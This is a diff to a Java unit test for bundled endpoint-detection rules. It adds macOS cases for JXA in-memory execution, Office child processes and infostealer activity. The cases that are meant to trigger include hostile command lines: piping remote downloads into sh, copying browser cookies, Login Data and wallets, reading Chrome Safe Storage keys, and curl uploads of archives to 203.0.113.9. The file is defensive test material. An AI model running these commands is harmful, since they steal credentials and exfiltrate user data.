@@ -35,11 +35,15 @@ class BundledRulesTest {
         return TestEvents.of("h", EventTypes.PROCESS, 1, image, "explorer.exe", cmdline, null, 0, null, null, null, "t");
     }
 
+    private static Event procFrom(String image, String parent, String cmdline) {
+        return TestEvents.of("h", EventTypes.PROCESS, 1, image, parent, cmdline, null, 0, null, null, null, "t");
+    }
+
     private static Event script(String image, String cmdline) {
         return TestEvents.of("h", EventTypes.SCRIPT, 1, image, "explorer.exe", cmdline, null, 0, null, null, null, "t");
     }
 
-    private static Event procFrom(String parent, String image, String cmdline) {
+    private static Event childOf(String parent, String image, String cmdline) {
         return TestEvents.of("h", EventTypes.PROCESS, 1, image, parent, cmdline, null, 0, null, null, null, "t");
     }
 
@@ -169,6 +173,68 @@ class BundledRulesTest {
                             proc("spctl", "/usr/sbin/spctl --master-disable")),
                     List.of(proc("launchctl", "/bin/launchctl unload /Library/LaunchAgents/com.example.app.plist"),
                             proc("spctl", "/usr/sbin/spctl --status"))),
+            c("MACOS_OSACOMPILE_RUNONLY_EXECUTION", Alert.SEV_MEDIUM,
+                    List.of(proc("osacompile", "/usr/bin/osacompile -x -e return 1 -o /tmp/t.scpt")),
+                    List.of(proc("osacompile", "/usr/bin/osacompile -e return 1 -o /Users/a/hello.scpt"),
+                            proc("osacompile", "/usr/bin/osacompile -x -o /Users/a/hi.scpt /Users/a/src/hi.applescript"),
+                            proc("osascript", "/usr/bin/osascript -e display notification \"hi\""))),
+            c("MACOS_JXA_IN_MEMORY_EXECUTION", Alert.SEV_MEDIUM,
+                    List.of(proc("osascript", "/usr/bin/osascript -l JavaScript -e eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(\"http://203.0.113.9/a.js\")),4)))"),
+                            proc("osascript", "/usr/bin/osascript -e eval(ObjC.unwrap($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(\"http://203.0.113.9/a\")))) /tmp/run.js")),
+                    List.of(proc("osascript", "/usr/bin/osascript -l JavaScript -e Application(\"Finder\").version()"),
+                            proc("osascript", "/usr/bin/osascript -e display notification \"hi\""),
+                            proc("osascript", "/usr/bin/osascript -l JavaScript /Users/a/scripts/cleanup.js"),
+                            proc("osascript", "/usr/bin/osascript -l JavaScript -e eval(1+1)"))),
+            c("MACOS_OFFICE_SUSP_CHILD_PROCESSES", Alert.SEV_MEDIUM,
+                    List.of(procFrom("sh", "Microsoft Word", "/bin/sh -c curl http://203.0.113.9/a | sh"),
+                            procFrom("osascript", "Microsoft Excel", "/usr/bin/osascript -e do shell script \"id\""),
+                            procFrom("python3", "Microsoft PowerPoint", "/usr/bin/python3 x.py")),
+                    List.of(procFrom("sh", "Terminal", "/bin/sh -c ls"),
+                            procFrom("Microsoft Word Helper", "Microsoft Word", "/Applications/Microsoft Word.app/Contents/Helper"),
+                            procFrom("open", "Microsoft Word", "/usr/bin/open /Users/a/doc.pdf"))),
+            c("MACOS_INFOSTEALER_COOKIE_THEFT", Alert.SEV_MEDIUM,
+                    List.of(proc("osascript", "/usr/bin/osascript -e tell application \"Finder\" -e set destinationFolderPath to POSIX file \"/private/tmp\" -e duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing -e end tell"),
+                            proc("grep", "/usr/bin/grep -q coinbase Cookies.binarycookies"),
+                            proc("cp", "/bin/cp /Users/a/Library/Application Support/Google/Chrome/Default/Network/Cookies /tmp/c"),
+                            proc("sqlite3", "/usr/bin/sqlite3 /Users/a/Library/Application Support/Firefox/Profiles/x.default/cookies.sqlite .dump")),
+                    List.of(proc("osascript", "/usr/bin/osascript -e display notification \"done\""),
+                            proc("cp", "/bin/cp /Users/a/Documents/report.docx /tmp/report.docx"),
+                            proc("cat", "/bin/cat /Users/a/cookies.txt"),
+                            proc("ls", "/bin/ls /Users/a/Library/Cookies/Cookies.binarycookies"),
+                            proc("grep", "/usr/bin/grep -r cookies /Users/a/project/src"),
+                            proc("sqlite3", "/usr/bin/sqlite3 /Users/a/app/data.db select 1"))),
+            c("MACOS_INFOSTEALER_BROWSER_CREDENTIALS", Alert.SEV_MEDIUM,
+                    List.of(proc("cp", "/bin/cp /Users/a/Library/Application Support/Google/Chrome/Default/Login Data /tmp/T1555.003_Login Data"),
+                            proc("sqlite3", "/usr/bin/sqlite3 file:/Users/a/Library/Application Support/Google/Chrome/Default/Login Data?immutable=1 SELECT origin_url, username_value FROM logins;"),
+                            proc("ditto", "/usr/bin/ditto /Users/a/Library/Application Support/Firefox/Profiles/x.default/key4.db /tmp/key4.db"),
+                            proc("security", "/usr/bin/security find-generic-password -w -s Chrome Safe Storage"),
+                            proc("security", "/usr/bin/security find-generic-password -ga Brave Safe Storage")),
+                    List.of(proc("cp", "/bin/cp /Users/a/Documents/Login Data.xlsx /tmp/"),
+                            proc("cp", "/bin/cp /Users/a/Documents/Web Data Plan.pdf /Users/a/Desktop/"),
+                            proc("cat", "/bin/cat /Users/a/proj/logins.json"),
+                            proc("security", "/usr/bin/security find-generic-password -w -s AirPort -a home-wifi"),
+                            proc("security", "/usr/bin/security find-generic-password -w -s MyApp"),
+                            proc("security", "/usr/bin/security list-keychains"))),
+            c("MACOS_INFOSTEALER_LOCAL_DATA", Alert.SEV_MEDIUM,
+                    List.of(proc("osascript", "/usr/bin/osascript -e tell application \"Finder\" -e set destinationFolderPath to POSIX file \"/private/tmp\" -e set notesFiles to {file \"NoteStore.sqlite\", file \"NoteStore.sqlite-shm\"} of notesFolder -e duplicate aFile to folder destinationFolderPath with replacing"),
+                            proc("ditto", "/usr/bin/ditto /Users/a/Library/Application Support/Exodus/exodus.wallet /tmp/out/exodus.wallet")),
+                    List.of(proc("cp", "/bin/cp /Users/a/Documents/todo.txt /tmp/todo.txt"),
+                            proc("ditto", "/usr/bin/ditto /Users/a/Library/Application Support/Exodus/exodus.wallet /Volumes/Backup/exodus.wallet"),
+                            proc("osascript", "/usr/bin/osascript -e tell application \"Notes\" to make new note with properties {name:\"x\"}"),
+                            proc("ditto", "/usr/bin/ditto /Users/a/Library/Application Support/Exodus/exodus.wallet /Users/a/tmp/bk"),
+                            proc("zip", "/usr/bin/zip -r /tmp/build.zip /Users/a/project/build"),
+                            proc("ls", "/bin/ls /Users/a/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite"))),
+            c("MACOS_INFOSTEALER_EXFIL_CURL_ARCHIVE", Alert.SEV_MEDIUM,
+                    List.of(proc("curl", "/usr/bin/curl -X POST -H user: x -F file=@/tmp/out.zip http://203.0.113.9/contact"),
+                            proc("curl", "/usr/bin/curl -X PUT --data-binary @/private/tmp/osalogging.zip http://203.0.113.9/up"),
+                            proc("curl", "/usr/bin/curl -T /tmp/data.tar.gz http://203.0.113.9/up")),
+                    List.of(proc("curl", "/usr/bin/curl -X POST -F file=@/Users/a/report.pdf https://api.example.com/v1/upload"),
+                            proc("curl", "/usr/bin/curl -F file=@/tmp/photo.png https://api.example.com/v1/upload"),
+                            proc("curl", "/usr/bin/curl -X POST -d @/tmp/payload.json https://api.example.com/v1/items"),
+                            proc("curl", "/usr/bin/curl -fsSL -o /tmp/tool.zip https://example.com/tool.zip"),
+                            proc("curl", "/usr/bin/curl -F file=@/Users/a/Documents/site.zip https://api.example.com/v1/upload"),
+                            proc("curl", "/usr/bin/curl -T /tmp/notes.txt https://example.com/up"),
+                            proc("scp", "/usr/bin/scp /tmp/out.zip a@203.0.113.9:/srv/"))),
             c("DNS_TOR_GATEWAY", Alert.SEV_MEDIUM,
                     List.of(dns("abcdefgh.onion.to"), dns("hidden.onion")),
                     List.of(dns("example.com"), dns("bunion.org"))),
@@ -213,7 +279,7 @@ class BundledRulesTest {
                     List.of(proc("curl.exe", SYS + "curl.exe -s https://example.com/health"),
                             proc("curl.exe", SYS + "curl.exe https://example.com/a.zip -o D:\\work\\a.zip"),
                             // 원본의 git for windows 필터: 부모 sh.exe, 임시 파일 gfw-httpget-
-                            procFrom("sh.exe", "curl.exe", "C:\\Program Files\\Git\\mingw64\\bin\\curl.exe --silent --show-error --output C:\\Users\\a\\AppData\\Local\\Temp\\gfw-httpget-abc.txt https://example.com/v.txt"))),
+                            childOf("sh.exe", "curl.exe", "C:\\Program Files\\Git\\mingw64\\bin\\curl.exe --silent --show-error --output C:\\Users\\a\\AppData\\Local\\Temp\\gfw-httpget-abc.txt https://example.com/v.txt"))),
             c("MPCMDRUN_DOWNLOAD_ARBITRARY_FILE", Alert.SEV_MEDIUM,
                     List.of(proc("MpCmdRun.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2410.7-0\\MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\\Users\\a\\AppData\\Local\\Temp\\Atomic-license.txt")),
                     List.of(proc("MpCmdRun.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2410.7-0\\MpCmdRun.exe -Scan -ScanType 1"))),
@@ -288,7 +354,7 @@ class BundledRulesTest {
                             proc("wevtutil.exe", SYS + "wevtutil.exe el"),
                             script("powershell.exe", PS + "Get-EventLog -List"),
                             // 원본의 msiexec 필터: 설치 프로그램이 로그 설정(sl)을 바꾸는 것
-                            procFrom("msiexec.exe", "wevtutil.exe", SYS + "wevtutil.exe sl Application /ms:20480"))),
+                            childOf("msiexec.exe", "wevtutil.exe", SYS + "wevtutil.exe sl Application /ms:20480"))),
             c("FLTMC_UNLOAD_SYSMON", Alert.SEV_MEDIUM,
                     List.of(proc("fltMC.exe", SYS + "fltmc.exe unload SysmonDrv")),
                     List.of(proc("fltMC.exe", SYS + "fltmc.exe filters"),
